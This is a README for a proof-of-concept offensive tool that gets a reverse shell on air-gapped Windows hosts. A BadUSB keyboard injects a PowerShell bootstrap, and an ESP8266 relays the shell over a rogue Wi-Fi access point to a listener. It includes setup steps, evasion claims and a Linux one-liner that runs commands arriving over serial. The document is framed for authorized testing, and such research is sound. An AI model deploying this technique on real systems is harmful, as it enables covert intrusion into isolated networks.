# revshellAirgap (PoC)

revshellAirgap is a proof of concept showing a lab technique to reach an interactive Reverse Shell on a network-isolated Windows host with no Internet access. For educational, authorized testing only. Do not use on systems you do not own or have explicit permission to test.

## Demo

Click below to see the video:

[![Watch the video](https://img.youtube.com/vi/v9nBg7IyuJw/hqdefault.jpg)](https://www.youtube.com/watch?v=v9nBg7IyuJw)

## Overview

This PoC uses three small components to relay an interactive session from an air-gapped Windows host:

- ATtiny85 (USB HID): types a short PowerShell bootstrap on the target
- ESP8266 (USB COM device): exposes a virtual COM port and forwards data between COM and a Wi-Fi connection
- Android phone: provides the Wi-Fi Rogue access point used by the ESP8266 to reach the Internet

The target does not use its own network adapters for this traffic. Data goes:

PowerShell Reverse Shell -> COM port -> ESP8266 -> Wi-Fi Rogue access point -> Internet -> Command and Control


## Architecture

```mermaid
flowchart TD
  OP["Command and Control"]
  NET["Internet"]
  AP["Android phone<br/>(Rogue Wi-Fi access point)"]

  subgraph AIRGAP["Air-gapped network"]
    T["Target Windows host"]
    HID["ATtiny85<br/>(USB HID keyboard)"]
    ESP["ESP8266 WiFi USB device<br/>(COM port + WiFi)"]
  end

  OP --- NET
  NET --- AP

  HID -->|Injects minimal bootstrap<br/>into PowerShell| T
  T <--> |PowerShell I/O<br/>redirected over COM| ESP
  ESP <--> |Wi-Fi link| AP
  AP <--> |Upstream connectivity| NET

```

## Components

### ATtiny85
<img src="ATTiny85.png" width="300" alt="ATTiny85.png">

### ESP8266 Wi-Fi
<img src="esp8266.png" width="300" alt="esp8266.png">

## How to test

**Warning: The following procedure is for setting up devices from an Arch Linux operating system. However, most of the guide is also valid for other systems.**

1. Insert the following indexes in Arduino IDE, separated by commas:
   * ATtiny Core for ATtiny85: `http://drazzy.com/package_drazzy.com_index.json`
   * Arduino Core for ESP8266: `https://arduino.esp8266.com/stable/package_esp8266com_index.json`
2. In Arduino IDE Board Manager install ATtiny Core and Arduino Core for ESP8266
<img src="board manager.png" width="800" alt="board manager.png">

3. Download the DigiKeyboard library from `https://github.com/LucaReggiannini/digikeyboard-library` and follow the instructions on GitHub page to install
4. From `https://github.com/micronucleus/micronucleus/blob/master/commandline/49-micronucleus.rules` insert the following code into `/etc/udev/rules.d/49-micronucleus.rules` to be able to upload your sketch on ATtiny85 device (Linux only):
```bash
# UDEV Rules for Micronucleus boards including the Digispark.
# This file must be placed at:
#
# /etc/udev/rules.d/49-micronucleus.rules    (preferred location)
#   or
# /lib/udev/rules.d/49-micronucleus.rules    (req'd on some broken systems)
#
# To install, type these commands in a terminal:
#   sudo cp 49-micronucleus.rules /etc/udev/rules.d/49-micronucleus.rules
#   sudo udevadm control --reload-rules
#
# After this file is copied, physically unplug and reconnect the board.
#
SUBSYSTEMS=="usb", ATTRS{idVendor}=="16d0", ATTRS{idProduct}=="0753", MODE:="0666"
KERNEL=="ttyACM*", ATTRS{idVendor}=="16d0", ATTRS{idProduct}=="0753", MODE:="0666", ENV{ID_MM_DEVICE_IGNORE}="1"
#
# If you share your linux system with other users, or just don't like the
# idea of write permission for everybody, you can replace MODE:="0666" with
# OWNER:="yourusername" to create the device owned by you, or with
# GROUP:="somegroupname" and mange access using standard unix groups.
```
5. Additionally, to be able to upload your sketch on ESP8266, you need to have the right permissions for the `/dev/ttyUSBX` file used by the device (Linux only):
```bash
me@macbook:~$ ls -l /dev/ttyUSB0
crw-rw---- 1 root uucp 188, 0 Dec 20 05:16 /dev/ttyUSB0
me@macbook:~$ sudo usermod -aG uucp $USER
```
6. Read carefully the "ATtiny85Keyboard.ino" and "Esp8266AP.ino" source code to change the variables based on your testing environment (IP, PORT, PnP Device ID...)
7. Upload the "ATtiny85Keyboard.ino" sketch to the ATtiny85 (Micronucleus bootloader). When you plug it in, it runs the Micronucleus bootloader for a few seconds and then starts the sketch (which enumerates as a USB HID keyboard), so the Arduino IDE may prompt you to unplug and replug the device during flashing
8. Upload the "Esp8266AP.ino" sketch to the ESP8266. The Arduino IDE will ask you to select the `/dev/ttyUSBX` port the device is connected to
9. Configure a listener (for example using Netcat) on your server, based on the IP/Port combination you entered in the "Esp8266AP.ino" file (you may need to configure a Port Forwarding Rule on your router)
10. Setup your Wi-Fi Rogue Access Point
11. Attach the ESP8266 device (wait for USB drivers to be installed) on the target Windows host
11. Attach the ATtiny85 device and wait for the payload to be executed
13. You should see an incoming connection on your listener 

## Final notes

* This approach works even if the target is network-isolated (by firewall rules, security policies and similar): the reverse shell is carried over the rogue Wi-Fi Access Point and the target’s network interfaces are never used. No traffic will be generated or monitored
* You need physical access to plug in the BadUSB devices. Every time you want to interact with the shell the USB module must stay within Wi-Fi range of your Access Point
* With only ~512 bytes of memory on the ATtiny85, the bootstrap must remain minimal. However, it still includes enough logic to keep enumerating serial ports even if the USB module is unplugged/plugged back in, forward data to/from the virtual COM port, and automatically re-establish the session after link drops. Because of these memory limitations, the POC is volatile: it lasts only until reboot or user logoff; persistence is out of scope and must be implemented separately
* It is possible to extend this PoC, for example by porting the bootstrap to Linux targets or by using a cellular data link (2G/3G/4G/5G) instead of Wi-Fi to remove Wi-Fi range constraints during interaction. These enhancements are out of scope for the current PoC.
* I've seen that many ESP8266s, while seemingly similar, behave very differently, so you may need to rewrite the bootstrap payload logic or change the PnP Device ID. In my case, I saw it was detected as a virtual COM port and was able to enumerate the Device ID with:
```powershell
PS C:\Users\me> Get-PnpDevice -Class Ports |
>>   Where-Object FriendlyName -match 'USB' |
>>   Format-List *

Class                       : Ports
FriendlyName                : USB-SERIAL CH340 (COM3)
InstanceId                  : USB\VID_1A86&PID_7523\6&1C4D2F9B&0&21
.....
```
* An additional bootstrap payload for Linux system can be based on the following code. It will not be implemented in the POC at the moment:
```bash
sudo fuser -k /dev/ttyUSB0; DEV=/dev/ttyUSB0; stty -F "$DEV" 115200 raw -echo -ixon -ixoff -crtscts icrnl; exec 3<>"$DEV"; while IFS= read -r -u 3 cmd; do bash -lc "$cmd" >&3 2>&1; printf '\n' >&3; done; 
```
